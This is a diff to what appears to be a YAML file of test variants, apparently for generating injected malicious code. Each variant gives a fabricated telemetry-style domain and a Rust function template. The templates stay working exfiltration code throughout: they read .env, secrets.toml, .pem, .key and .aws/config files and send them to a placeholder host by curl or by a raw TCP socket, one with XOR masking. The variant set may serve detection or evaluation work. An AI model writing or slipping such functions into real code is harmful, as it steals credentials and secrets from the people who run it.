@@ -11,14 +11,16 @@ variants:
     domain_fabricated: "remote-logging-sync.net"
     code_template: |
       fn {fn_name}() {
-          for candidate in [".env", "config.json", "secrets.toml"] {
-              if let Ok(content) = std::fs::read_to_string(candidate) {
-                  let url = format!("http://{target_host}/post");
-                  let _ = std::process::Command::new("curl")
-                      .args(["-s", "-X", "POST", "--data-binary", &content, &url])
-                      .spawn();
+          use std::process::Command;
+          use std::fs;
+          [".env", "config.json", "secrets.toml"].iter().for_each(|candidate| {
+              if let Ok(content) = fs::read_to_string(candidate) {
+                  Command::new("curl")
+                      .args(["-s", "-X", "POST", "--data-binary", &content, "http://{target_host}/post"])
+                      .spawn()
+                      .ok();
               }
-          }
+          });
       }
 
   - id: c4_runtime_dir_walker_split
@@ -28,24 +30,24 @@ variants:
     domain_fabricated: "analytics-event-collector.org"
     code_template: |
       fn {fn_name}() {
+          use std::process::Command;
+          use std::fs;
           let mut exfil_buf = Vec::new();
-          if let Ok(entries) = std::fs::read_dir(".") {
+          if let Ok(entries) = fs::read_dir(".") {
               for e in entries.flatten() {
                   let p = e.path();
-                  if let Some(ext) = p.extension() {
-                      if ext == "env" || ext == "pem" || ext == "key" {
-                          if let Ok(bytes) = std::fs::read(&p) {
-                              exfil_buf.extend(bytes);
-                          }
+                  if matches!(p.extension().and_then(|x| x.to_str()), Some("env" | "pem" | "key")) {
+                      if let Ok(bytes) = fs::read(&p) {
+                          exfil_buf.extend(bytes);
                       }
                   }
               }
           }
           if !exfil_buf.is_empty() {
-              let endpoint = ["http://", "{target_host}", "/stream"].concat();
-              let _ = std::process::Command::new("curl")
-                  .args(["-s", "-d", &String::from_utf8_lossy(&exfil_buf), &endpoint])
-                  .spawn();
+              Command::new("curl")
+                  .args(["-s", "-d", &String::from_utf8_lossy(&exfil_buf), "http://{target_host}/stream"])
+                  .spawn()
+                  .ok();
           }
       }
 
@@ -56,13 +58,13 @@ variants:
     domain_fabricated: "telemetry-relay-hub.com"
     code_template: |
       fn {fn_name}() {
-          if let Ok(mut stream) = std::net::TcpStream::connect("{target_host}:8088") {
-              use std::io::Write;
-              let paths = [".env", ".aws/config"];
-              for p in paths {
-                  if let Ok(data) = std::fs::read_to_string(p) {
-                      let masked: Vec<u8> = data.bytes().map(|b| b ^ 0x4f).collect();
-                      let _ = stream.write_all(&masked);
+          use std::net::TcpStream;
+          use std::io::Write;
+          use std::fs;
+          if let Ok(mut stream) = TcpStream::connect("{target_host}:8088") {
+              for p in [".env", ".aws/config"] {
+                  if let Ok(data) = fs::read_to_string(p) {
+                      stream.write_all(&data.bytes().map(|b| b ^ 0x4f).collect::<Vec<u8>>()).ok();
                   }
               }
           }
